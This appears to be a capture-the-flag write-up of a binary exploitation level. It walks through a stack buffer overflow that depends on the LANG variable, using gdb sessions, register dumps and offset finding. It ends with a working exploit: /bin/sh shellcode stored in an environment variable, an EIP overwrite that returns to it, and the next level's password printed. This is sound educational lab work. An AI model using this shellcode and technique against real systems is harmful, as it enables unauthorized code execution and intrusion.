Here we have a program that requires 2 args. It will copy the first 40 bytes of av[1] in dest, then copy the first 32 bytes of av[2] in (dest + 40). So dest will be at most 72 characters, and it has a buffer of 76.

Then there is a call to getenv that will check the LANG env variable. This will be used in the greetuser() function, that will concatenate 'Hello' in the selected language with the previous buffer to a new variable called dest. At first glance we can't guess easily the buffer size of dest, so we'll try to see if we can manually overflow it using long strings.

av[1] needs to be 40 characters, otherwise a \0 will be written and we won't be able to use av[2].

    (gdb) run "1234567890123456789012345678901234567890" "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
    Starting program: /home/user/bonus2/bonus2 "1234567890123456789012345678901234567890" "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
    Hello 1234567890123456789012345678901234567890Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

    Program received signal SIGSEGV, Segmentation fault.
    0x08006241 in ?? ()
    (gdb) i r
    eax            0x4f	79
    ecx            0xffffffff	-1
    edx            0xb7fd28b8	-1208145736
    ebx            0xbffff640	-1073744320
    esp            0xbffff5f0	0xbffff5f0
    ebp            0x39614138	0x39614138  <-- offset 26
    esi            0xbffff68c	-1073744244
    edi            0xbffff63c	-1073744324
    eip            0x8006241	0x8006241
    [...]

We successfully overflowed EBP, but it won't be of much use here. EIP remain untouched. We can try another language to see if we get different results :

    $ export LANG=nl
    [...]
    (gdb) r 1234567890123456789012345678901234567890 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    Starting program: /home/user/bonus2/bonus2 1234567890123456789012345678901234567890 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    Goedemiddag! 1234567890123456789012345678901234567890Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

    Program received signal SIGSEGV, Segmentation fault.
    0x38614137 in ?? ()
    (gdb) i r
    eax            0x56	86
    ecx            0xffffffff	-1
    edx            0xb7fd28b8	-1208145736
    ebx            0xbffff640	-1073744320
    esp            0xbffff5f0	0xbffff5f0
    ebp            0x61413661	0x61413661  <-- offset 19
    esi            0xbffff68c	-1073744244
    edi            0xbffff63c	-1073744324
    eip            0x38614137	0x38614137  <-- offset 23

This time we can overflow EIP. What we can do now is simply store a shellcode calling /bin/sh in an environment variable, get its address and pass it to EIP, exactly like bonus0.

Let's try it :

    $ export PAYLOAD=$(python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"')
    $ ./a.out
    address of $PAYLOAD: bfffffaa
    $ ./bonus2 1234567890123456789012345678901234567890 $(python -c 'print "A" * 23 + "\xaa\xff\xff\xbf"')
    Goedemiddag! 1234567890123456789012345678901234567890AAAAAAAAAAAAAAAAAAAAAAA����
    $ cd ../bonus3
    $ cat .pass
    71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587

